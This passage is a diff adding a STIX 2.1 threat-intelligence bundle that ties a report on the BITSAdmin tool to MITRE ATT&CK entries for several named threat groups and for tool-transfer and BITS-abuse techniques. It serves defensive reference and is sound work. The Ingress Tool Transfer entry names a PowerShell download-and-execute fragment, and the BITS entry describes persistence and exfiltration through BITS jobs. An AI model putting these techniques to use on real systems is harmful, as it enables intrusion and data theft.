@@ -1,0 +1,1213 @@
+{
+  "spec_version": "2.1",
+  "id": "bundle--8fe3c6e9-cf57-46da-9080-6af62eb28c42",
+  "type": "bundle",
+  "objects": [
+    {
+      "name": "Nounou Mbeiri",
+      "description": "MITRE ATT&CK Defender (MAD) | Cyber Threat Intelligence researcher | Collaborator in Cyber Threat Intelligence community (GINSEG) | Public Speaking",
+      "identity_class": "individual",
+      "contact_information": "Twitter: @Nounou_Mbeiri",
+      "id": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "type": "identity",
+      "spec_version": "2.1",
+      "created": "2021-03-10T10:00:00.000Z",
+      "modified": "2021-03-10T10:00:00.000Z"
+    },
+    {
+      "name": "LOLBin: BITSAdmin",
+      "description": "Bitsadmin is a command-line tool used to create, download or upload jobs, and to monitor their progress. The bitsadmin tool uses switches to identify the work to perform. You can call bitsadmin /? or bitsadmin /help to get a list of switches.",
+      "published": "2023-08-25T19:59:11.000Z",
+      "id": "report--daaf4899-83a9-4781-a656-23629da2a7df",
+      "type": "report",
+      "spec_version": "2.1",
+      "created_by_ref": "identity--1dd7bca6-cef5-4395-826f-64994241b3cf",
+      "created": "2023-08-25T19:59:11.000Z",
+      "modified": "2023-08-25T19:59:11.000Z",
+      "report_types": [
+        "tool"
+      ],
+      "object_refs": [
+        "tool--64764dc6-a032-495f-8250-1e4c06bdc163"
+      ]
+    },
+    {
+      "name": "BITSAdmin",
+      "description": "[BITSAdmin](https://attack.mitre.org/software/S0190) is a command line tool used to create and manage [BITS Jobs](https://attack.mitre.org/techniques/T1197). (Citation: Microsoft BITSAdmin)",
+      "id": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+      "type": "tool",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "labels": [
+        "tool"
+      ],
+      "created": "2018-04-18T17:59:24.739Z",
+      "modified": "2022-10-13T18:56:28.568Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0190",
+          "external_id": "S0190"
+        },
+        {
+          "source_name": "Microsoft BITSAdmin",
+          "description": "Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.",
+          "url": "https://msdn.microsoft.com/library/aa362813.aspx"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "APT41",
+      "description": "[APT41](https://attack.mitre.org/groups/G0096) is a threat group that researchers have assessed as Chinese state-sponsored espionage group that also conducts financially-motivated operations. Active since at least 2012, [APT41](https://attack.mitre.org/groups/G0096) has been observed targeting healthcare, telecom, technology, and video game industries in 14 countries. [APT41](https://attack.mitre.org/groups/G0096) overlaps at least partially with public reporting on groups including BARIUM and [Winnti Group](https://attack.mitre.org/groups/G0044).(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)\n",
+      "aliases": [
+        "APT41",
+        "Wicked Panda"
+      ],
+      "id": "intrusion-set--18854f55-ac7c-4634-bd9a-352dd07613b7",
+      "type": "intrusion-set",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2019-09-23T13:43:36.945Z",
+      "modified": "2023-03-23T15:45:58.846Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0096",
+          "external_id": "G0096"
+        },
+        {
+          "source_name": "Wicked Panda",
+          "description": "(Citation: Crowdstrike GTR2020 Mar 2020)"
+        },
+        {
+          "source_name": "APT41",
+          "description": "(Citation: FireEye APT41 2019)"
+        },
+        {
+          "source_name": "Crowdstrike GTR2020 Mar 2020",
+          "description": "Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020.",
+          "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+        },
+        {
+          "source_name": "FireEye APT41 2019",
+          "description": "FireEye. (2019). Double DragonAPT41, a dual espionage andcyber crime operationAPT41. Retrieved September 23, 2019.",
+          "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+        },
+        {
+          "source_name": "FireEye APT41 Aug 2019",
+          "description": "Fraser, N., et al. (2019, August 7). Double DragonAPT41, a dual espionage and cyber crime operation APT41. Retrieved September 23, 2019.",
+          "url": "https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf"
+        },
+        {
+          "source_name": "Group IB APT 41 June 2021",
+          "description": "Rostovcev, N. (2021, June 10). Big airline heist APT41 likely behind a third-party attack on Air India. Retrieved August 26, 2021.",
+          "url": "https://www.group-ib.com/blog/colunmtk-apt41/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "Ferocious Kitten",
+      "description": "[Ferocious Kitten](https://attack.mitre.org/groups/G0137) is a threat group that has primarily targeted Persian-speaking individuals in Iran since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)",
+      "aliases": [
+        "Ferocious Kitten"
+      ],
+      "id": "intrusion-set--6566aac9-dad8-4332-ae73-20c23bad7f02",
+      "type": "intrusion-set",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2021-09-28T17:41:12.950Z",
+      "modified": "2021-10-25T14:28:10.337Z",
+      "external_references": [
+        {
+          "external_id": "G0137",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0137"
+        },
+        {
+          "source_name": "Kaspersky Ferocious Kitten Jun 2021",
+          "url": "https://securelist.com/ferocious-kitten-6-years-of-covert-surveillance-in-iran/102806/",
+          "description": "GReAT. (2021, June 16). Ferocious Kitten: 6 Years of Covert Surveillance in Iran. Retrieved September 22, 2021."
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "HEXANE",
+      "description": "[HEXANE](https://attack.mitre.org/groups/G1001) is a cyber espionage threat group that has targeted oil & gas, telecommunications, aviation, and internet service provider organizations since at least 2017. Targeted companies have been located in the Middle East and Africa, including Israel, Saudi Arabia, Kuwait, Morocco, and Tunisia. [HEXANE](https://attack.mitre.org/groups/G1001)'s TTPs appear similar to [APT33](https://attack.mitre.org/groups/G0064) and [OilRig](https://attack.mitre.org/groups/G0049) but due to differences in victims and tools it is tracked as a separate entity.(Citation: Dragos Hexane)(Citation: Kaspersky Lyceum October 2021)(Citation: ClearSky Siamesekitten August 2021)(Citation: Accenture Lyceum Targets November 2021)",
+      "aliases": [
+        "HEXANE",
+        "Lyceum",
+        "Siamesekitten",
+        "Spirlin"
+      ],
+      "id": "intrusion-set--f29b7c5e-2439-42ad-a86f-9f8984fafae3",
+      "type": "intrusion-set",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2018-10-17T00:14:20.652Z",
+      "modified": "2023-03-22T04:43:59.082Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G1001",
+          "external_id": "G1001"
+        },
+        {
+          "source_name": "Spirlin",
+          "description": "(Citation: Accenture Lyceum Targets November 2021)"
+        },
+        {
+          "source_name": "Siamesekitten",
+          "description": "(Citation: ClearSky Siamesekitten August 2021)"
+        },
+        {
+          "source_name": "Lyceum",
+          "description": "(Citation: SecureWorks August 2019)"
+        },
+        {
+          "source_name": "Accenture Lyceum Targets November 2021",
+          "description": "Accenture. (2021, November 9). Who are latest targets of cyber group Lyceum?. Retrieved June 16, 2022.",
+          "url": "https://www.accenture.com/us-en/blogs/cyber-defense/iran-based-lyceum-campaigns"
+        },
+        {
+          "source_name": "ClearSky Siamesekitten August 2021",
+          "description": "ClearSky Cyber Security . (2021, August). New Iranian Espionage Campaign By “Siamesekitten” - Lyceum. Retrieved June 6, 2022.",
+          "url": "https://www.clearskysec.com/siamesekitten/"
+        },
+        {
+          "source_name": "Dragos Hexane",
+          "description": "Dragos. (n.d.). Hexane. Retrieved October 27, 2019.",
+          "url": "https://dragos.com/resource/hexane/"
+        },
+        {
+          "source_name": "Kaspersky Lyceum October 2021",
+          "description": "Kayal, A. et al. (2021, October). LYCEUM REBORN: COUNTERINTELLIGENCE IN THE MIDDLE EAST. Retrieved June 14, 2022.",
+          "url": "https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf"
+        },
+        {
+          "source_name": "SecureWorks August 2019",
+          "description": "SecureWorks 2019, August 27 LYCEUM Takes Center Stage in Middle East Campaign Retrieved. 2019/11/19 ",
+          "url": "https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "Leviathan",
+      "description": "[Leviathan](https://attack.mitre.org/groups/G0065) is a Chinese state-sponsored cyber espionage group that has been attributed to the Ministry of State Security's (MSS) Hainan State Security Department and an affiliated front company.(Citation: CISA AA21-200A APT40 July 2021) Active since at least 2009, [Leviathan](https://attack.mitre.org/groups/G0065) has targeted the following sectors: academia, aerospace/aviation, biomedical, defense industrial base, government, healthcare, manufacturing, maritime, and transportation across the US, Canada, Europe, the Middle East, and Southeast Asia.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)",
+      "aliases": [
+        "Leviathan",
+        "MUDCARP",
+        "Kryptonite Panda",
+        "Gadolinium",
+        "BRONZE MOHAWK",
+        "TEMP.Jumper",
+        "APT40",
+        "TEMP.Periscope"
+      ],
+      "id": "intrusion-set--7113eaa5-ba79-4fb3-b68a-398ee9cd698e",
+      "type": "intrusion-set",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2018-04-18T17:59:24.739Z",
+      "modified": "2022-04-15T15:15:51.198Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "G0065",
+          "url": "https://attack.mitre.org/groups/G0065"
+        },
+        {
+          "source_name": "MUDCARP",
+          "description": "(Citation: CISA AA21-200A APT40 July 2021)(Citation: Accenture MUDCARP March 2019)"
+        },
+        {
+          "source_name": "Kryptonite Panda",
+          "description": "(Citation: CISA AA21-200A APT40 July 2021)(Citation: Crowdstrike KRYPTONITE PANDA August 2018)"
+        },
+        {
+          "source_name": "Gadolinium",
+          "description": "(Citation: CISA AA21-200A APT40 July 2021)(Citation: MSTIC GADOLINIUM September 2020)"
+        },
+        {
+          "source_name": "BRONZE MOHAWK",
+          "description": "(Citation: CISA AA21-200A APT40 July 2021)(Citation: SecureWorks BRONZE MOHAWK n.d.)"
+        },
+        {
+          "source_name": "Leviathan",
+          "description": "(Citation: Proofpoint Leviathan Oct 2017)"
+        },
+        {
+          "source_name": "TEMP.Jumper",
+          "description": "[Leviathan](https://attack.mitre.org/groups/G0065) was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.(Citation: CISA AA21-200A APT40 July 2021)(Citation: FireEye APT40 March 2019)"
+        },
+        {
+          "source_name": "TEMP.Periscope",
+          "description": "[Leviathan](https://attack.mitre.org/groups/G0065) was previously reported upon by FireEye as TEMP.Periscope and TEMP.Jumper.(Citation: CISA AA21-200A APT40 July 2021)(Citation: FireEye Periscope March 2018)(Citation: FireEye APT40 March 2019)"
+        },
+        {
+          "source_name": "Accenture MUDCARP March 2019",
+          "url": "https://www.accenture.com/us-en/blogs/cyber-defense/mudcarps-focus-on-submarine-technologies",
+          "description": "Accenture iDefense Unit. (2019, March 5). Mudcarp's Focus on Submarine Technologies. Retrieved August 24, 2021."
+        },
+        {
+          "source_name": "Crowdstrike KRYPTONITE PANDA August 2018",
+          "url": "https://www.crowdstrike.com/blog/two-birds-one-stone-panda/",
+          "description": "Adam Kozy. (2018, August 30). Two Birds, One Stone Panda. Retrieved August 24, 2021."
+        },
+        {
+          "source_name": "Proofpoint Leviathan Oct 2017",
+          "url": "https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets",
+          "description": "Axel F, Pierre T. (2017, October 16). Leviathan: Espionage actor spearphishes maritime and defense targets. Retrieved February 15, 2018."
+        },
+        {
+          "source_name": "MSTIC GADOLINIUM September 2020",
+          "url": "https://www.microsoft.com/security/blog/2020/09/24/gadolinium-detecting-empires-cloud/",
+          "description": "Ben Koehl, Joe Hannon. (2020, September 24). Microsoft Security - Detecting Empires in the Cloud. Retrieved August 24, 2021."
+        },
+        {
+          "source_name": "CISA AA21-200A APT40 July 2021",
+          "url": "https://us-cert.cisa.gov/ncas/alerts/aa21-200a",
+          "description": "CISA. (2021, July 19). (AA21-200A) Joint Cybersecurity Advisory – Tactics, Techniques, and Procedures of Indicted APT40 Actors Associated with China’s MSS Hainan State Security Department. Retrieved August 12, 2021."
+        },
+        {
+          "source_name": "APT40",
+          "description": "FireEye reporting on TEMP.Periscope (which was combined into APT40) indicated TEMP.Periscope was reported upon as Leviathan.(Citation: CISA AA21-200A APT40 July 2021)(Citation: Proofpoint Leviathan Oct 2017)(Citation: FireEye Periscope March 2018)(Citation: FireEye APT40 March 2019)"
+        },
+        {
+          "source_name": "FireEye Periscope March 2018",
+          "url": "https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html",
+          "description": "FireEye. (2018, March 16). Suspected Chinese Cyber Espionage Group (TEMP.Periscope) Targeting U.S. Engineering and Maritime Industries. Retrieved April 11, 2018."
+        },
+        {
+          "source_name": "FireEye APT40 March 2019",
+          "url": "https://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html",
+          "description": "Plan, F., et al. (2019, March 4). APT40: Examining a China-Nexus Espionage Actor. Retrieved March 18, 2019."
+        },
+        {
+          "source_name": "SecureWorks BRONZE MOHAWK n.d.",
+          "url": "https://www.secureworks.com/research/threat-profiles/bronze-mohawk",
+          "description": "SecureWorks. (n.d.). Threat Profile - BRONZE MOHAWK. Retrieved August 24, 2021."
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "modified": "2023-03-22T05:44:27.289Z",
+      "name": "Wizard Spider",
+      "description": "[Wizard Spider](https://attack.mitre.org/groups/G0102) is a Russia-based financially motivated threat group originally known for the creation and deployment of [TrickBot](https://attack.mitre.org/software/S0266) since at least 2016. [Wizard Spider](https://attack.mitre.org/groups/G0102) possesses a diverse arsenal of tools and has conducted ransomware campaigns against a variety of organizations, ranging from major corporations to hospitals.(Citation: CrowdStrike Ryuk January 2019)(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020)(Citation: CrowdStrike Wizard Spider October 2020)",
+      "aliases": [
+        "Wizard Spider",
+        "UNC1878",
+        "TEMP.MixMaster",
+        "Grim Spider"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Edward Millington",
+        "Oleksiy Gayda"
+      ],
+      "type": "intrusion-set",
+      "id": "intrusion-set--dd2d9ca6-505b-4860-a604-233685b802c7",
+      "created": "2020-05-12T18:15:29.396Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0102",
+          "external_id": "G0102"
+        },
+        {
+          "source_name": "Grim Spider",
+          "description": "(Citation: CrowdStrike Ryuk January 2019)(Citation: CrowdStrike Grim Spider May 2019)"
+        },
+        {
+          "source_name": "UNC1878",
+          "description": "(Citation: FireEye KEGTAP SINGLEMALT October 2020)"
+        },
+        {
+          "source_name": "TEMP.MixMaster",
+          "description": "(Citation: FireEye Ryuk and Trickbot January 2019)"
+        },
+        {
+          "source_name": "DHS/CISA Ransomware Targeting Healthcare October 2020",
+          "description": "DHS/CISA. (2020, October 28). Ransomware Activity Targeting the Healthcare and Public Health Sector. Retrieved October 28, 2020.",
+          "url": "https://us-cert.cisa.gov/ncas/alerts/aa20-302a"
+        },
+        {
+          "source_name": "FireEye Ryuk and Trickbot January 2019",
+          "description": "Goody, K., et al (2019, January 11). A Nasty Trick: From Credential Theft Malware to Business Disruption. Retrieved May 12, 2020.",
+          "url": "https://www.fireeye.com/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html"
+        },
+        {
+          "source_name": "CrowdStrike Ryuk January 2019",
+          "description": "Hanel, A. (2019, January 10). Big Game Hunting with Ryuk: Another Lucrative Targeted Ransomware. Retrieved May 12, 2020.",
+          "url": "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"
+        },
+        {
+          "source_name": "CrowdStrike Grim Spider May 2019",
+          "description": "John, E. and Carvey, H. (2019, May 30). Unraveling the Spiderweb: Timelining ATT&CK Artifacts Used by GRIM SPIDER. Retrieved May 12, 2020.",
+          "url": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+        },
+        {
+          "source_name": "FireEye KEGTAP SINGLEMALT October 2020",
+          "description": "Kimberly Goody, Jeremy Kennelly, Joshua Shilko, Steve Elovitz, Douglas Bienstock. (2020, October 28). Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser. Retrieved October 28, 2020.",
+          "url": "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+        },
+        {
+          "source_name": "CrowdStrike Wizard Spider October 2020",
+          "description": "Podlosky, A., Hanel, A. et al. (2020, October 16). WIZARD SPIDER Update: Resilient, Reactive and Resolute. Retrieved June 15, 2021.",
+          "url": "https://www.crowdstrike.com/blog/wizard-spider-adversary-update/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack",
+        "ics-attack"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Tropic Trooper",
+      "description": "[Tropic Trooper](https://attack.mitre.org/groups/G0081) is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. [Tropic Trooper](https://attack.mitre.org/groups/G0081) focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper May 2020)",
+      "aliases": [
+        "Tropic Trooper",
+        "Pirate Panda",
+        "KeyBoy"
+      ],
+      "id": "intrusion-set--56319646-eb6e-41fc-ae53-aadfa7adb924",
+      "type": "intrusion-set",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2019-01-29T20:17:48.717Z",
+      "modified": "2021-04-26T14:15:15.610Z",
+      "external_references": [
+        {
+          "external_id": "G0081",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/groups/G0081"
+        },
+        {
+          "source_name": "Tropic Trooper",
+          "description": "(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: Unit 42 Tropic Trooper Nov 2016)"
+        },
+        {
+          "source_name": "Pirate Panda",
+          "description": "(Citation: Crowdstrike Pirate Panda April 2020)"
+        },
+        {
+          "source_name": "KeyBoy",
+          "description": "(Citation: Unit 42 Tropic Trooper Nov 2016)(Citation: TrendMicro Tropic Trooper Mar 2018)"
+        },
+        {
+          "description": "Horejsi, J., et al. (2018, March 14). Tropic Trooper’s New Strategy. Retrieved November 9, 2018.",
+          "url": "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/",
+          "source_name": "TrendMicro Tropic Trooper Mar 2018"
+        },
+        {
+          "description": "Ray, V. (2016, November 22). Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison Ivy. Retrieved November 9, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2016/11/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/",
+          "source_name": "Unit 42 Tropic Trooper Nov 2016"
+        },
+        {
+          "source_name": "TrendMicro Tropic Trooper May 2020",
+          "url": "https://documents.trendmicro.com/assets/Tech-Brief-Tropic-Trooper-s-Back-USBferry-Attack-Targets-Air-gapped-Environments.pdf",
+          "description": "Chen, J.. (2020, May 12). Tropic Trooper’s Back: USBferry Attack Targets Air gapped Environments. Retrieved May 20, 2020."
+        },
+        {
+          "source_name": "Crowdstrike Pirate Panda April 2020",
+          "url": "https://www.crowdstrike.com/blog/on-demand-webcast-crowdstrike-experts-on-covid-19-cybersecurity-challenges-and-recommendations/",
+          "description": "Busselen, M. (2020, April 7). On-demand Webcast: CrowdStrike Experts on COVID-19 Cybersecurity Challenges and Recommendations. Retrieved May 20, 2020."
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "Lateral Tool Transfer",
+      "description": "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).",
+      "id": "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+      "type": "attack-pattern",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2020-03-11T21:01:00.959Z",
+      "modified": "2022-04-19T15:34:49.016Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "T1570",
+          "url": "https://attack.mitre.org/techniques/T1570"
+        },
+        {
+          "source_name": "Unit42 LockerGoga 2019",
+          "url": "https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/",
+          "description": "Harbison, M. (2019, March 26). Born This Way? Origins of LockerGoga. Retrieved April 16, 2019."
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "lateral-movement"
+        }
+      ]
+    },
+    {
+      "name": "Ingress Tool Transfer",
+      "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.(Citation: PTSecurity Cobalt Dec 2016)\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.(Citation: t1105_lolbas)",
+      "id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add",
+      "type": "attack-pattern",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2017-05-31T21:31:16.408Z",
+      "modified": "2023-04-14T19:27:57.370Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1105",
+          "external_id": "T1105"
+        },
+        {
+          "source_name": "University of Birmingham C2",
+          "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+          "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+        },
+        {
+          "source_name": "t1105_lolbas",
+          "description": "LOLBAS. (n.d.). LOLBAS Mapped to T1105. Retrieved March 11, 2022.",
+          "url": "https://lolbas-project.github.io/#t1105"
+        },
+        {
+          "source_name": "PTSecurity Cobalt Dec 2016",
+          "description": "Positive Technologies. (2016, December 16). Cobalt Snatch. Retrieved October 9, 2018.",
+          "url": "https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "command-and-control"
+        }
+      ]
+    },
+    {
+      "name": "BITS Jobs",
+      "description": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
+      "id": "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
+      "type": "attack-pattern",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2018-04-18T17:59:24.739Z",
+      "modified": "2023-04-21T12:21:40.927Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1197",
+          "external_id": "T1197"
+        },
+        {
+          "source_name": "CTU BITS Malware June 2016",
+          "description": "Counter Threat Unit Research Team. (2016, June 6). Malware Lingers with BITS. Retrieved January 12, 2018.",
+          "url": "https://www.secureworks.com/blog/malware-lingers-with-bits"
+        },
+        {
+          "source_name": "Symantec BITS May 2007",
+          "description": "Florio, E. (2007, May 9). Malware Update with Windows Update. Retrieved January 12, 2018.",
+          "url": "https://www.symantec.com/connect/blogs/malware-update-windows-update"
+        },
+        {
+          "source_name": "Elastic - Hunting for Persistence Part 1",
+          "description": "French, D., Murphy, B. (2020, March 24). Adversary tradecraft 101: Hunting for persistence using Elastic Security (Part 1). Retrieved December 21, 2020.",
+          "url": "https://www.elastic.co/blog/hunting-for-persistence-using-elastic-security-part-1"
+        },
+        {
+          "source_name": "PaloAlto UBoatRAT Nov 2017",
+          "description": "Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
+        },
+        {
+          "source_name": "Microsoft Issues with BITS July 2011",
+          "description": "Microsoft. (2011, July 19). Issues with BITS. Retrieved January 12, 2018.",
+          "url": "https://technet.microsoft.com/library/dd939934.aspx"
+        },
+        {
+          "source_name": "Microsoft BITS",
+          "description": "Microsoft. (n.d.). Background Intelligent Transfer Service. Retrieved January 12, 2018.",
+          "url": "https://msdn.microsoft.com/library/windows/desktop/bb968799.aspx"
+        },
+        {
+          "source_name": "Microsoft BITSAdmin",
+          "description": "Microsoft. (n.d.). BITSAdmin Tool. Retrieved January 12, 2018.",
+          "url": "https://msdn.microsoft.com/library/aa362813.aspx"
+        },
+        {
+          "source_name": "Microsoft COM",
+          "description": "Microsoft. (n.d.). Component Object Model (COM). Retrieved November 22, 2017.",
+          "url": "https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx"
+        },
+        {
+          "source_name": "Mondok Windows PiggyBack BITS May 2007",
+          "description": "Mondok, M. (2007, May 11). Malware piggybacks on Windows’ Background Intelligent Transfer Service. Retrieved January 12, 2018.",
+          "url": "https://arstechnica.com/information-technology/2007/05/malware-piggybacks-on-windows-background-intelligent-transfer-service/"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "kill_chain_phases": [
+        {
